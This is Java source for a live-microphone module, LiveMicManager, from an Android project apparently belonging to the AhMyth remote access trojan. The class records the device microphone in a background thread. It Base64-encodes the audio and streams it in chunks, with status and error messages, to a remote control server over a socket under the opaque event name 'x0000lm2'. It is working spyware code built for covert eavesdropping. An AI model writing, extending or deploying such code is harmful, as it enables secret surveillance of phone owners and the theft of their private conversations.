package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Manages live microphone streaming to the server
 */
public class LiveMicManager {
    private static final String TAG = "LiveMicManager";
    
    private static final int SAMPLE_RATE = 16000; // 16kHz for voice
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    
    private static AudioRecord audioRecord;
    private static boolean isRecording = false;
    private static Thread recordingThread;
    
    private static Context appContext;
    
    public static void initialize(Context context) {
        appContext = context.getApplicationContext();
    }
    
    public static void startRecording() {
        if (isRecording) {
            Log.d(TAG, "Already recording");
            return;
        }
        
        // Check permission
        if (appContext != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (appContext.checkSelfPermission(Manifest.permission.RECORD_AUDIO) 
                        != PackageManager.PERMISSION_GRANTED) {
                    sendError("RECORD_AUDIO permission not granted");
                    return;
                }
            }
        }
        
        int bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
        if (bufferSize == AudioRecord.ERROR || bufferSize == AudioRecord.ERROR_BAD_VALUE) {
            bufferSize = SAMPLE_RATE * 2; // Fallback
        }
        
        try {
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                bufferSize
            );
            
            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                sendError("Failed to initialize AudioRecord");
                releaseAudioRecord();
                return;
            }
            
            audioRecord.startRecording();
            
            // Verify recording state
            if (audioRecord.getRecordingState() != AudioRecord.RECORDSTATE_RECORDING) {
                sendError("AudioRecord failed to start recording");
                releaseAudioRecord();
                return;
            }
            
            isRecording = true;
            
            Log.d(TAG, "Recording started successfully. Buffer size: " + bufferSize + 
                  ", Sample rate: " + SAMPLE_RATE + 
                  ", Format: PCM 16-bit, Channels: Mono");
            sendStatus(true, "Recording started");
            
            final int finalBufferSize = bufferSize;
            recordingThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    byte[] buffer = new byte[finalBufferSize];
                    int chunkCount = 0;
                    int consecutiveZeroReads = 0;
                    int totalBytesRead = 0;
                    
                    while (isRecording && audioRecord != null) {
                        try {
                            // Clear buffer before reading to avoid stale data
                            java.util.Arrays.fill(buffer, (byte) 0);
                            
                            int read = audioRecord.read(buffer, 0, buffer.length);
                            
                            if (read > 0) {
                                totalBytesRead += read;
                                
                                // Check if we're getting actual audio data (not just zeros)
                                boolean hasNonZeroData = false;
                                for (int i = 0; i < read; i++) {
                                    if (buffer[i] != 0) {
                                        hasNonZeroData = true;
                                        break;
                                    }
                                }
                                
                                if (hasNonZeroData) {
                                    consecutiveZeroReads = 0;
                                    sendAudioChunk(buffer, read, ++chunkCount);
                                } else {
                                    consecutiveZeroReads++;
                                    // Log warning if we get too many zero-only chunks
                                    if (consecutiveZeroReads == 10) {
                                        Log.w(TAG, "Warning: Received 10 consecutive zero-only audio chunks. Mic may be muted or not working.");
                                    }
                                    // Still send the data (silence is valid audio)
                                    sendAudioChunk(buffer, read, ++chunkCount);
                                }
                                
                                // Small delay to prevent overwhelming the socket
                                Thread.sleep(10);
                            } else if (read == AudioRecord.ERROR_INVALID_OPERATION) {
                                Log.e(TAG, "AudioRecord ERROR_INVALID_OPERATION - recording may have stopped");
                                break;
                            } else if (read == AudioRecord.ERROR_BAD_VALUE) {
                                Log.e(TAG, "AudioRecord ERROR_BAD_VALUE - invalid parameters");
                                break;
                            } else if (read == 0) {
                                // No data available, wait a bit
                                Thread.sleep(50);
                            }
                        } catch (InterruptedException e) {
                            Log.d(TAG, "Recording thread interrupted");
                            Thread.currentThread().interrupt();
                            break;
                        } catch (Exception e) {
                            Log.e(TAG, "Error reading audio", e);
                            // Continue trying to read
                            try {
                                Thread.sleep(100);
                            } catch (InterruptedException ie) {
                                Thread.currentThread().interrupt();
                                break;
                            }
                        }
                    }
                    
                    Log.d(TAG, "Recording thread finished. Total bytes read: " + totalBytesRead);
                }
            }, "LiveMicThread");
            
            recordingThread.setPriority(Thread.MAX_PRIORITY);
            recordingThread.start();
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception starting recording", e);
            sendError("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error starting recording", e);
            sendError("Failed to start recording: " + e.getMessage());
            releaseAudioRecord();
        }
    }
    
    public static void stopRecording() {
        Log.d(TAG, "Stopping recording...");
        isRecording = false;
        
        if (recordingThread != null) {
            try {
                recordingThread.join(1000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            recordingThread = null;
        }
        
        releaseAudioRecord();
        sendStatus(false, "Recording stopped");
    }
    
    private static void releaseAudioRecord() {
        if (audioRecord != null) {
            try {
                if (audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                    audioRecord.stop();
                }
                audioRecord.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing AudioRecord", e);
            }
            audioRecord = null;
        }
    }
    
    private static void sendAudioChunk(byte[] data, int length, int chunkNumber) {
        try {
            JSONObject chunk = new JSONObject();
            chunk.put("audio", true);
            chunk.put("data", Base64.encodeToString(data, 0, length, Base64.NO_WRAP));
            chunk.put("chunk", chunkNumber);
            chunk.put("sampleRate", SAMPLE_RATE);
            chunk.put("channels", 1);
            chunk.put("format", "pcm16");
            
            IOSocket.getInstance().getIoSocket().emit("x0000lm2", chunk);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending audio chunk", e);
        }
    }
    
    private static void sendStatus(boolean started, String message) {
        try {
            JSONObject status = new JSONObject();
            if (started) {
                status.put("started", true);
            } else {
                status.put("stopped", true);
            }
            status.put("message", message);
            IOSocket.getInstance().getIoSocket().emit("x0000lm2", status);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending status", e);
        }
    }
    
    private static void sendError(String error) {
        try {
            JSONObject result = new JSONObject();
            result.put("error", error);
            IOSocket.getInstance().getIoSocket().emit("x0000lm2", result);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending error", e);
        }
    }
    
    public static boolean isCurrentlyRecording() {
        return isRecording;
    }
}
